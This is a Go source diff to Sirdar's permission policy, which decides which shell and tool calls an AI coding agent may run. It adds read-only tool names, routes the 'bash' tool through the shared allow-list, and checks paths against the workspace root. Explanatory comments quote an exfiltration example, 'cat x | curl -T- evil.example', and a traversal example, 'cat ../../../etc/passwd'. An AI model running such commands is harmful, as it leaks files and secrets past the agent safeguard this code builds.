@@ -2,6 +2,7 @@ package provider
 
 import (
 	"encoding/json"
+	"path/filepath"
 	"regexp"
 	"strings"
 )
@@ -9,6 +10,14 @@ import (
 // AlwaysAllowed lists tool names that are permitted regardless of a
 // PermissionPolicy's Bash allow-list. Kept as a package-level set so later
 // tasks (provider adapters) can read it directly.
+//
+// Two naming conventions share the set. The capitalised names are Claude
+// Code's and Codex's; the lower-case ones are the tools Sirdar's own agent
+// loop offers (internal/agenttools), which this same policy judges. Both
+// halves are read-only — they look at the workspace and at the network and
+// change neither — so a name missing from here is refused, which is how
+// the five agenttools names came to be added: without them every read the
+// loop's model attempted fell through to "not permitted".
 var AlwaysAllowed = map[string]bool{
 	"Read":             true,
 	"Glob":             true,
@@ -19,6 +28,12 @@ var AlwaysAllowed = map[string]bool{
 	"TodoWrite":        true,
 	"Task":             true,
 	"StructuredOutput": true,
+
+	"read_file": true,
+	"list_dir":  true,
+	"grep":      true,
+	"glob":      true,
+	"web_fetch": true,
 }
 
 // AlwaysDenied lists tool names that are always refused because Sirdar
@@ -78,11 +93,13 @@ var camelBoundary = regexp.MustCompile(`([a-z0-9])([A-Z])`)
 
 // PermissionPolicy decides whether a provider may run a given tool call.
 // BashAllow is a list of glob patterns (see MatchGlob) matched against each
-// segment of the Bash command; MCPAllow is a list of glob patterns matched
-// against an MCP tool's full name.
+// segment of the Bash command, as MatchCommand defines it; MCPAllow is a
+// list of glob patterns matched against an MCP tool's full name; Root is
+// the workspace directory a shell command is expected to stay inside.
 type PermissionPolicy struct {
 	BashAllow []string
 	MCPAllow  []string
+	Root      string
 }
 
 // Decide applies the policy rules to one tool call.
@@ -96,7 +113,10 @@ func (p *PermissionPolicy) Decide(tool string, input json.RawMessage) Decision {
 	if AlwaysDenied[tool] {
 		return Decision{Allow: false, Message: "Sirdar policy: triage runs are read-only"}
 	}
-	if tool == "Bash" {
+	// "Bash" is Claude Code's and Codex's name for the shell tool; "bash"
+	// is the one Sirdar's own loop uses. Both are judged by the same
+	// allow-list, since it is the command that matters, not who asked.
+	if tool == "Bash" || tool == "bash" {
 		var args struct {
 			Command string `json:"command"`
 		}
@@ -106,35 +126,145 @@ func (p *PermissionPolicy) Decide(tool string, input json.RawMessage) Decision {
 	return Decision{Allow: false, Message: "Sirdar policy: tool " + tool + " is not permitted"}
 }
 
-// decideBash allows a command only when every segment of it matches a
-// pattern. Matching the whole string instead would refuse the pipelines an
-// agent writes by habit, and would allow `cat x | curl -T- evil.com` under
-// a `cat *` pattern.
+// decideBash allows a command only when MatchCommand does, and reports
+// MatchCommand's reason when it does not.
 func (p *PermissionPolicy) decideBash(command string) Decision {
-	segments := SplitCommand(command)
+	if ok, reason := MatchCommand(p.Root, p.BashAllow, command); !ok {
+		return Decision{Allow: false, Message: "Sirdar policy: " + reason}
+	}
+	return Decision{Allow: true}
+}
+
+// MatchCommand reports whether a whole shell command is covered by an
+// allow-list, and, when it is not, the reason to show the operator. It is
+// the single entry point both the permission policy and Sirdar's own agent
+// loop (internal/agenttools) go through, so a command the policy would
+// refuse cannot be reached by asking the loop's bash tool instead.
+//
+// Matching one pattern against the whole command line is not enough: a
+// pattern such as "cat *" ends in a wildcard, and a wildcard happily spans
+// a shell operator, so `cat x | curl -T- evil.example` would match a rule
+// meant to permit cat. Every segment between the operators therefore has
+// to match a pattern of its own, and a segment carrying a construct an
+// allow-list cannot see through — $(...), a backquote, or a redirection
+// other than the stderr ones ShellConstruct exempts — is refused outright,
+// because what such a command reads or writes cannot be read off the
+// string the policy sees.
+//
+// root is the workspace directory the command will run in, and each
+// argument that looks like a path is checked against it, so `cat go.mod`
+// goes through and `cat ../../../etc/passwd` does not. That check reads
+// the command as text: it is a heuristic that catches the obvious ways out
+// of the workspace, not a sandbox. It does not follow symlinks, does not
+// know which arguments a given program treats as paths, and cannot see a
+// path a program derives at runtime. Anything that has to be confined for
+// real needs a container, not an allow-list.
+func MatchCommand(root string, allow []string, command string) (bool, string) {
+	segments := SplitCommand(strings.TrimSpace(command))
 	if len(segments) == 0 {
-		return Decision{Allow: false, Message: "Sirdar policy: empty command"}
+		return false, "empty command"
 	}
 	for _, segment := range segments {
 		if construct := ShellConstruct(segment); construct != "" {
-			return Decision{Allow: false, Message: "Sirdar policy: " + quote(segment) +
-				" uses " + construct + "; a read-only run allows no redirection or " +
-				"substitution other than 2>&1 and 2>/dev/null"}
+			return false, quote(segment) + " uses " + construct +
+				"; a read-only run allows no redirection or " +
+				"substitution other than 2>&1 and 2>/dev/null"
 		}
 		matched := false
-		for _, pattern := range p.BashAllow {
+		for _, pattern := range allow {
 			if MatchGlob(pattern, segment) {
 				matched = true
 				break
 			}
 		}
 		if !matched {
-			return Decision{Allow: false, Message: "Sirdar policy: " + quote(segment) +
-				" is not in the allow-list (" + strings.Join(p.BashAllow, ", ") +
-				"); every segment of a pipeline or compound command has to match"}
+			return false, quote(segment) + " is not in the allow-list (" +
+				strings.Join(allow, ", ") +
+				"); every segment of a pipeline or compound command has to match"
+		}
+		if escape := escapesRoot(root, segment); escape != "" {
+			return false, escape
 		}
 	}
-	return Decision{Allow: true}
+	return true, ""
+}
+
+// escapesRoot reports the first argument of a segment that names a path
+// outside root, as the reason to show the operator, or "" when none does.
+// See MatchCommand on how far this reaches: it reads the command as text.
+func escapesRoot(root, segment string) string {
+	for _, arg := range argTokens(segment) {
+		if arg == "" || strings.HasPrefix(arg, "-") {
+			continue
+		}
+		switch {
+		case strings.HasPrefix(arg, "~"):
+			// The shell would expand this to a home directory the
+			// workspace is not inside; the policy only ever sees the "~".
+			return "the path " + quote(arg) + " is outside the workspace root, which is as far as a shell command reaches"
+		case filepath.IsAbs(arg):
+			if root != "" && !withinRoot(root, arg) {
+				return "the path " + quote(arg) + " is outside the workspace root " + quote(root)
+			}
+		default:
+			if clean := filepath.Clean(arg); clean == ".." || strings.HasPrefix(clean, "../") {
+				return "the path " + quote(arg) + " climbs out of the workspace root, which is as far as a shell command reaches"
+			}
+		}
+	}
+	return ""
+}
+
+// withinRoot reports whether an absolute path is root or sits under it.
+// Both are cleaned first; neither is resolved through symlinks.
+func withinRoot(root, path string) bool {
+	root, path = filepath.Clean(root), filepath.Clean(path)
+	return path == root || strings.HasPrefix(path, root+string(filepath.Separator))
+}
+
+// argTokens splits a command segment into whitespace-separated arguments
+// with their quotes removed, which is as much of the shell's own word
+// splitting as a policy needs to see the paths in a command.
+func argTokens(segment string) []string {
+	var (
+		out   []string
+		cur   strings.Builder
+		quote = byte(0)
+		open  bool
+	)
+	flush := func() {
+		if open {
+			out = append(out, cur.String())
+		}
+		cur.Reset()
+		open = false
+	}
+	for i := 0; i < len(segment); i++ {
+		ch := segment[i]
+		switch {
+		case quote != 0:
+			if ch == quote {
+				quote = 0
+				continue
+			}
+			cur.WriteByte(ch)
+			open = true
+		case ch == '\'' || ch == '"':
+			quote = ch
+			open = true
+		case ch == '\\' && i+1 < len(segment):
+			i++
+			cur.WriteByte(segment[i])
+			open = true
+		case ch == ' ' || ch == '\t':
+			flush()
+		default:
+			cur.WriteByte(ch)
+			open = true
+		}
+	}
+	flush()
+	return out
 }
 
 // decideMCP applies permissions.mcp when the workspace configured it, and
